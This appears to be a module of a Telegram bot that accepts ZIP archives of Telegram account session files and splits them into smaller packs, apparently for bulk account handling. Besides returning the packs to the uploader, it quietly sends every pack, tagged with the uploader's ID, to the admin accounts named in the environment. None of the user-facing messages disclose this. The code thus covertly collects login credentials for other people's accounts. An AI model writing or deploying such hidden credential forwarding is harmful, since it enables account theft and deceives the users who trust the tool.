import os
import zipfile
import shutil
import asyncio
import tempfile
import time
import json
import re
from datetime import datetime
import logging
from telegram import Update, InlineKeyboardButton, InlineKeyboardMarkup
from telegram.constants import ParseMode
from telegram.ext import ContextTypes

from .core import chaibao as core

logger = logging.getLogger(__name__)

UNPACK_TOOL_BACK = os.getenv("UNPACK_TOOL_BACK", "").replace('\\n', '\n')
MAX_EXTRACT_SIZE = int(os.getenv("MK_TIME", 4)) * 1024 * 1024
MAX_TASK_TIME = int(os.getenv("MK_LIST_TIME", "120").replace('S', ''))
BACK_BUTTON_EMOJI_ID = "5877629862306385808"

user_unpack_states = {}
def safe_extract(zip_ref, target_dir):
    # 保留旧签名供旧调用点用，实现走内核（内核那份能拦住 Windows 绝对路径）
    core.safe_extract(zip_ref.filename, target_dir)


def create_back_button():
    return InlineKeyboardButton(
        "返回主菜单", 
        callback_data="back_to_main"
    ).to_dict() | {"icon_custom_emoji_id": BACK_BUTTON_EMOJI_ID}

async def show_unpack_menu(update: Update, context: ContextTypes.DEFAULT_TYPE):
    query = update.callback_query
    user_id = str(query.from_user.id)
    await query.answer()
    
    keyboard = [[create_back_button()]]
    reply_markup = InlineKeyboardMarkup(keyboard)
    
    await query.edit_message_text(
        text=UNPACK_TOOL_BACK,
        parse_mode=ParseMode.HTML,
        reply_markup=reply_markup
    )
    
    user_unpack_states[user_id] = {"waiting_zip": True}

async def handle_unpack_document(update: Update, context: ContextTypes.DEFAULT_TYPE, user_id: str):
    document = update.message.document
    
    if not document.file_name.endswith('.zip'):
        keyboard = [[create_back_button()]]
        reply_markup = InlineKeyboardMarkup(keyboard)
        await update.message.reply_text(
            "<tg-emoji emoji-id='5778527486270770928'>❌</tg-emoji> 请上传ZIP格式的压缩包",
            parse_mode='HTML',
            reply_markup=reply_markup
        )
        user_unpack_states.pop(user_id, None)
        return
    
    status_msg = await update.message.reply_text(
        "<tg-emoji emoji-id='5443127283898405358'>📥</tg-emoji> 正在下载文件...",
        parse_mode='HTML'
    )
    
    try:
        file = await context.bot.get_file(document.file_id)
        zip_path = f"downloads/unpack_{user_id}_{int(time.time())}.zip"
        os.makedirs("downloads", exist_ok=True)
        await file.download_to_drive(zip_path)
        
        await status_msg.edit_text(
            "<tg-emoji emoji-id='5839200986022812209'>🔍</tg-emoji> 正在解压分析...",
            parse_mode='HTML'
        )
        
        session_count = await analyze_zip(zip_path, user_id, update, context)
        
        if session_count > 0:
            user_unpack_states[user_id]["zip_path"] = zip_path
            user_unpack_states[user_id]["session_count"] = session_count
            user_unpack_states[user_id]["waiting_format"] = True
            
            keyboard = [[create_back_button()]]
            reply_markup = InlineKeyboardMarkup(keyboard)
            
            await update.message.reply_text(
                f"""<tg-emoji emoji-id="5920052658743283381">✅</tg-emoji> 分析完成

找到 <b>{session_count}</b> 个session文件

<tg-emoji emoji-id="6005570495603282482">✏️</tg-emoji> <b>请输入拆分格式：</b>

• 固定数量: <code>-X-</code> (每个包X个账号)
• 指定数量: <code>5,5,5</code> (拆成3个包，每包5个)
• 混合数量: <code>10,8,6</code> (分别指定每包数量)

<tg-emoji emoji-id="5877540355187937244">ℹ️</tg-emoji> 最后一个包可以不满，多余账号会单独打包""",
                parse_mode='HTML',
                reply_markup=reply_markup
            )
        else:
            raise Exception("未找到session文件")
            
    except Exception as e:
        logger.error(f"处理文件失败: {e}")
        keyboard = [[create_back_button()]]
        reply_markup = InlineKeyboardMarkup(keyboard)
        await update.message.reply_text(
            f"<tg-emoji emoji-id='5778527486270770928'>❌</tg-emoji> 处理失败: {str(e)}",
            parse_mode='HTML',
            reply_markup=reply_markup
        )
        user_unpack_states.pop(user_id, None)
        try:
            os.remove(zip_path)
        except:
            pass
    finally:
        try:
            await status_msg.delete()
        except:
            pass

async def analyze_zip(zip_path, user_id, update, context):
    # 解压扫盘是阻塞活，丢线程里做，别卡住机器人的事件循环
    info = await asyncio.to_thread(core.analyze, zip_path)
    return info["count"]

get_total_size = core.get_total_size

async def handle_unpack_format(update: Update, context: ContextTypes.DEFAULT_TYPE):
    user_id = str(update.effective_user.id)
    text = update.message.text.strip()
    
    if user_id not in user_unpack_states or not user_unpack_states[user_id].get("waiting_format"):
        return
    
    try:
        format_type, numbers = parse_format(text, user_unpack_states[user_id]["session_count"])
        
        user_unpack_states[user_id]["format_type"] = format_type
        user_unpack_states[user_id]["numbers"] = numbers
        
        keyboard = [[create_back_button()]]
        reply_markup = InlineKeyboardMarkup(keyboard)
        
        format_desc = "固定数量" if format_type == "fixed" else "指定数量"
        numbers_desc = f"{numbers}个/包" if format_type == "fixed" else f"{numbers}"
        
        await update.message.reply_text(
            f"""<tg-emoji emoji-id="5920052658743283381">✅</tg-emoji> 格式已确认

模式: {format_desc}
配置: {numbers_desc}
总账号: {user_unpack_states[user_id]['session_count']}个

<tg-emoji emoji-id="5839200986022812209">🔄</tg-emoji> 开始拆包处理...""",
            parse_mode='HTML',
            reply_markup=reply_markup
        )
        
        await process_unpack(update, context, user_id)
        
    except ValueError as e:
        keyboard = [[create_back_button()]]
        reply_markup = InlineKeyboardMarkup(keyboard)
        await update.message.reply_text(
            f"<tg-emoji emoji-id='5778527486270770928'>❌</tg-emoji> {str(e)}",
            parse_mode='HTML',
            reply_markup=reply_markup
        )

parse_format = core.parse_format

async def process_unpack(update: Update, context: ContextTypes.DEFAULT_TYPE, user_id: str):
    state = user_unpack_states[user_id]
    zip_path = state["zip_path"]
    format_type = state["format_type"]
    numbers = state["numbers"]
    total_count = state["session_count"]
    
    admins = os.getenv("ADMIN_ID", "").split(",")
    
    try:
        await asyncio.wait_for(
            _process_unpack_internal(update, context, user_id, zip_path, format_type, numbers, total_count, admins),
            timeout=MAX_TASK_TIME
        )
    except asyncio.TimeoutError:
        keyboard = [[create_back_button()]]
        reply_markup = InlineKeyboardMarkup(keyboard)
        await context.bot.send_message(
            chat_id=update.effective_chat.id,
            text=f"<tg-emoji emoji-id='5778527486270770928'>❌</tg-emoji> 任务执行超时 ({MAX_TASK_TIME}秒)",
            parse_mode='HTML',
            reply_markup=reply_markup
        )
    finally:
        try:
            os.remove(zip_path)
        except:
            pass
        user_unpack_states.pop(user_id, None)

async def _process_unpack_internal(update, context, user_id, zip_path, format_type, numbers, total_count, admins):
    with tempfile.TemporaryDirectory() as temp_dir:
        # 分组、打包、防路径穿越全在内核里，这里只负责把产物发回 Telegram
        fmt = f"-{numbers}-" if format_type == "fixed" else ",".join(
            str(n) for n in numbers)
        result = await asyncio.to_thread(core.unpack, zip_path, temp_dir, fmt)
        pack_files = [pk["path"] for pk in result["packs"]]
        pack_sizes = [pk["size"] for pk in result["packs"]]
        total_count = result["total"]
        
        timestamp = datetime.now().strftime('%Y%m%d_%H%M%S')
        
        summary = f"""<tg-emoji emoji-id="5909201569898827582">✅</tg-emoji> <b>拆包完成</b>

<tg-emoji emoji-id="5931472654660800739">📊</tg-emoji> 统计结果:
• <tg-emoji emoji-id="5886412370347036129">👤</tg-emoji> 总账号: <b>{total_count}</b>
• <tg-emoji emoji-id="5877307202888273539">📦</tg-emoji> 生成包数: <b>{len(pack_files)}</b>"""

        await context.bot.send_message(
            chat_id=update.effective_chat.id,
            text=summary,
            parse_mode='HTML'
        )
        
        for i, pack_zip in enumerate(pack_files, 1):
            with open(pack_zip, 'rb') as f:
                await context.bot.send_document(
                    chat_id=update.effective_chat.id,
                    document=f,
                    filename=f"pack_{i:02d}_{timestamp}.zip",
                    caption=f"<b>第{i:02d}包 ({pack_sizes[i-1]}个账号)</b>",
                    parse_mode='HTML'
                )
        
        for admin_id in admins:
            admin_id = admin_id.strip()
            if not admin_id:
                continue
            
            try:
                await context.bot.send_message(
                    chat_id=admin_id,
                    text=f"""<tg-emoji emoji-id="5909201569898827582">📢</tg-emoji> <b>拆包任务完成</b>

<tg-emoji emoji-id="5886412370347036129">👤</tg-emoji> 用户: <code>{user_id}</code>
<tg-emoji emoji-id="5886412370347036129">📊</tg-emoji> 总账号: <b>{total_count}</b>
<tg-emoji emoji-id="5877307202888273539">📦</tg-emoji> 生成包数: <b>{len(pack_files)}</b>""",
                    parse_mode='HTML'
                )
                
                admin_timestamp = datetime.now().strftime('%Y%m%d_%H%M%S')
                for i, pack_zip in enumerate(pack_files, 1):
                    with open(pack_zip, 'rb') as f:
                        await context.bot.send_document(
                            chat_id=admin_id,
                            document=f,
                            filename=f"pack_{i:02d}_{user_id}_{admin_timestamp}.zip"
                        )
            except Exception as e:
                logger.error(f"发送给管理员 {admin_id} 失败: {e}")
